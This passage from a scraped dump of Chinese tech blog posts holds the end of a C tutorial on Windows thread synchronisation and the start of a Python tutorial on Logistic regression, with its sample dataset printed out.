class=\"crayon-h\"> </span><span class=\"crayon-v\">INFINITE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//等待事件有信号</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-27\">　<span class=\"crayon-c\">//EnterCriticalSection(&amp;csPrint); //标记有线程进入临界区</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-28\">　<span class=\"crayon-c\">//WaitForSingleObject(mtxPrint, INFINITE); //等待互斥量空置（没有线程拥有它）</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-29\">　<span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-30\">　<span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%s: \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">HeadStr</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-31\">　<span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">i</span>　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-32\">　　<span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%d,\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-33\">　　<span class=\"crayon-e\">Sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//延时（可以去掉）</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-34\"><span class=\"crayon-c\">/*只是使得多线程对临界区访问的问题比较容易看得到</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-35\"><span class=\"crayon-c\">如果你把临界控制的语句注释掉，输出就会变得很凌乱，各个排序的结果会</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-36\"><span class=\"crayon-c\">分插间隔着输出，如果不延时就不容易看到这种不对临界区控制的结果</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-37\"><span class=\"crayon-c\">*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-38\">　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-39\">　<span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%d\\n\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-40\">　<span class=\"crayon-e\">SetEvent</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">evtPrint</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//把事件信号量恢复，变为有信号</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-41\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0074 seconds] -->\r\n<p></p>\n<h1>四、 小结</h1>\n<p>对复杂的应用程序来说，线程的应用给应用程序提供了高效、快速、安全的数据处理能力。本实例讲述了线程处理中经常遇到的问题，希望对读者朋友有一定的帮助，起到抛砖引玉的作用。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113186\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113186votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113186\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "2"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/04/ff247977ac3e5237654ad324e8c880ed.jpg"], "title": "机器学习之Logistic回归算法", "fav_nums": 2, "url": "http://blog.jobbole.com/113182/", "create_date": "2017/12/05", "url_object_id": "d61fbe74705766dc3935a52a0e1a0415", "comment_nums": 0, "front_image_path": "full/eadb28355fab57e9672e5c965147ef4caca04ac4.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://holynull.leanote.com/post/Logistic-2\">Holy Null</a>   </div><h1 id=\"title\">Logistic回归算法</h1>\n<p>本文介绍机器学习中的Logistic回归算法，我们使用这个算法来给数据进行分类。Logistic回归算法同样是需要通过样本空间学习的监督学习算法，并且适用于数值型和标称型数据，例如，我们需要根据输入数据的特征值（数值型）的大小来判断数据是某种分类或者不是某种分类。</p>\n<h2 id=\"title-1\">一、样本数据</h2>\n<p>在我们的例子中，我们有这样一些样本数据：</p>\n<ul>\n<li>样本数据有3个特征值：<span id=\"MathJax-Element-1-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-1\" class=\"math\"><span id=\"MathJax-Span-2\" class=\"mrow\"><span id=\"MathJax-Span-3\" class=\"msubsup\"><span id=\"MathJax-Span-4\" class=\"mi\">X</span><span id=\"MathJax-Span-5\" class=\"mn\">0</span></span></span></span><span class=\"MJX_Assistive_MathML\">X0</span></span>，<span id=\"MathJax-Element-2-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-6\" class=\"math\"><span id=\"MathJax-Span-7\" class=\"mrow\"><span id=\"MathJax-Span-8\" class=\"msubsup\"><span id=\"MathJax-Span-9\" class=\"mi\">X</span><span id=\"MathJax-Span-10\" class=\"mn\">1</span></span></span></span><span class=\"MJX_Assistive_MathML\">X1</span></span>，<span id=\"MathJax-Element-3-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-11\" class=\"math\"><span id=\"MathJax-Span-12\" class=\"mrow\"><span id=\"MathJax-Span-13\" class=\"msubsup\"><span id=\"MathJax-Span-14\" class=\"mi\">X</span><span id=\"MathJax-Span-15\" class=\"mn\">2</span></span></span></span><span class=\"MJX_Assistive_MathML\">X2</span></span></li>\n<li>我们通过这3个特征值中的<span id=\"MathJax-Element-4-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-16\" class=\"math\"><span id=\"MathJax-Span-17\" class=\"mrow\"><span id=\"MathJax-Span-18\" class=\"msubsup\"><span id=\"MathJax-Span-19\" class=\"mi\">X</span><span id=\"MathJax-Span-20\" class=\"mn\">1</span></span></span></span><span class=\"MJX_Assistive_MathML\">X1</span></span>和<span id=\"MathJax-Element-5-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-21\" class=\"math\"><span id=\"MathJax-Span-22\" class=\"mrow\"><span id=\"MathJax-Span-23\" class=\"msubsup\"><span id=\"MathJax-Span-24\" class=\"mi\">X</span><span id=\"MathJax-Span-25\" class=\"mn\">2</span></span></span></span><span class=\"MJX_Assistive_MathML\">X2</span></span>来判断数据是否符合要求，即符合要求的为1，不符合要求的为0。</li>\n<li>样本数据分类存放在一个数组中</li>\n</ul>\n<p>我们在logRegres.py文件中编写如下函数来准备数据，并将数据打印观察一下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a0cef72b356375870\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#coding=utf-8\r\nfrom numpy import *\r\ndef loadDataSet():\r\n    dataMat = []; labelMat = []\r\n    fr = open('testSet.txt')\r\n    for line in fr.readlines():\r\n        lineArr = line.strip().split()\r\n        dataMat.append([1.0, float(lineArr[0]), float(lineArr[1])])\r\n        labelMat.append(int(lineArr[2]))\r\n    return dataMat,labelMat\r\nif __name__=='__main__':\r\n    dataMat,labelMat=loadDataSet()\r\n    print 'dataMat:\\n',dataMat</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef72b356375870-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef72b356375870-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef72b356375870-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef72b356375870-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef72b356375870-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef72b356375870-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef72b356375870-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef72b356375870-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef72b356375870-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef72b356375870-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef72b356375870-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef72b356375870-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef72b356375870-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef72b356375870-1\"><span class=\"crayon-p\">#coding=utf-8</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef72b356375870-2\"><span class=\"crayon-e\">from </span><span class=\"crayon-e\">numpy </span><span class=\"crayon-e \">import *</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef72b356375870-3\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">loadDataSet</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef72b356375870-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">dataMat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef72b356375870-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">fr</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">open</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'testSet.txt'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef72b356375870-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">line </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fr</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">readlines</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef72b356375870-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">lineArr</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">line</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">strip</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">split</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef72b356375870-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">dataMat</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">float</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">lineArr</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">float</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">lineArr</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef72b356375870-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">lineArr</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef72b356375870-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">dataMat</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">labelMat</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef72b356375870-11\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">__name__</span><span class=\"crayon-o\">==</span><span class=\"crayon-s\">'__main__'</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef72b356375870-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">dataMat</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">loadDataSet</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef72b356375870-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">print</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'dataMat:\\n'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">dataMat</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0026 seconds] -->\r\n<p>我们来观察一下这个数据样本：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a0cef735920166847\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndataMat:\r\n[[1.0, -0.017612, 14.053064], [1.0, -1.395634, 4.662541], [1.0, -0.752157, 6.53862], [1.0, -1.322371, 7.152853], [1.0, 0.423363, 11.054677], [1.0, 0.406704, 7.067335], [1.0, 0.667394, 12.741452], [1.0, -2.46015, 6.866805], [1.0, 0.569411, 9.548755], [1.0, -0.026632, 10.427743], [1.0, 0.850433, 6.920334], [1.0, 1.347183, 13.1755], [1.0, 1.176813, 3.16702], [1.0, -1.781871, 9.097953], [1.0, -0.566606, 5.749003], [1.0, 0.931635, 1.589505], [1.0, -0.024205, 6.151823], [1.0, -0.036453, 2.690988], [1.0, -0.196949, 0.444165], [1.0, 1.014459, 5.754399], [1.0, 1.985298, 3.230619], [1.0, -1.693453, -0.55754], [1.0, -0.576525, 11.778922], [1.0, -0.346811, -1.67873], [1.0, -2.124484, 2.672471], [1.0, 1.217916, 9.597015], [1.0, -0.733928, 9.098687], [1.0, -3.642001, -1.618087], [1.0, 0.315985, 3.523953], [1.0, 1.416614, 9.619232], [1.0, -0.386323, 3.989286], [1.0, 0.556921, 8.294984], [1.0, 1.224863, 11.58736], [1.0, -1.347803, -2.406051], [1.0, 1.196604, 4.951851], [1.0, 0.275221, 9.543647], [1.0, 0.470575, 9.332488], [1.0, -1.889567, 9.542662], [1.0, -1.527893, 12.150579], [1.0, -1.185247, 11.309318], [1.0, -0.445678, 3.297303], [1.0, 1.042222, 6.105155], [1.0, -0.618787, 10.320986], [1.0, 1.152083, 0.548467], [1.0, 0.828534, 2.676045], [1.0, -1.237728, 10.549033], [1.0, -0.683565, -2.166125], [1.0, 0.229456, 5.921938], [1.0, -0.959885, 11.555336], [1.0, 0.492911, 10.993324], [1.0, 0.184992, 8.721488], [1.0, -0.355715, 10.325976], [1.0, -0.397822, 8.058397], [1.0, 0.824839, 13.730343], [1.0, 1.507278, 5.027866], [1.0, 0.099671, 6.835839], [1.0, -0.344008, 10.717485], [1.0, 1.785928, 7.718645], [1.0, -0.918801, 11.560217], [1.0, -0.364009, 4.7473], [1.0, -0.841722, 4.119083], [1.0, 0.490426, 1.960539], [1.0, -0.007194, 9.075792], [1.0, 0.356107, 12.447863], [1.0, 0.342578, 12.281162], [1.0, -0.810823, -1.466018], [1.0, 2.530777, 6.476801], [1.0, 1.296683, 11.607559], [1.0, 0.475487, 12.040035], [1.0, -0.783277, 11.009725], [1.0, 0.074798, 11.02365], [1.0, -1.337472, 0.468339], [1.0, -0.102781, 13.763651], [1.0, -0.147324, 2.874846], [1.0, 0.518389, 9.887035], [1.0, 1.015399, 7.571882], [1.0, -1.658086, -0.027255], [1.0, 1.319944, 2.171228], [1.0, 2.056216, 5.019981], [1.0, -0.851633, 4.375691], [1.0, -1.510047, 6.061992], [1.0, -1.076637, -3.181888], [1.0, 1.821096, 10.28399], [1.0, 3.01015, 8.401766], [1.0, -1.099458, 1.688274], [1.0, -0.834872, -1.733869], [1.0, -0.846637, 3.849075], [1.0, 1.400102, 12.628781], [1.0, 1.752842, 5.468166], [1.0, 0.078557, 0.059736], [1.0, 0.089392, -0.7153], [1.0, 1.825662, 12.693808], [1.0, 0.197445, 9.744638], [1.0, 0.126117, 0.922311], [1.0, -0.679797, 1.22053], [1.0, 0.677983, 2.556666], [1.0, 0.761349, 10.693862], [1.0, -2.168791, 0.143632], [1.0, 1.38861, 9.341997], [1.0, 0.317029, 14.739025]]\r\nlabelMat:\r\n[0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef735920166847-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef735920166847-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef735920166847-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef735920166847-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef735920166847-1\"><span class=\"crayon-v\">dataMat</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef735920166847-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.017612</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14.053064</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.395634</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4.662541</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.752157</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6.53862</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.322371</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7.152853</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.423363</span><span class=\"crayon-sy\">,</span><span 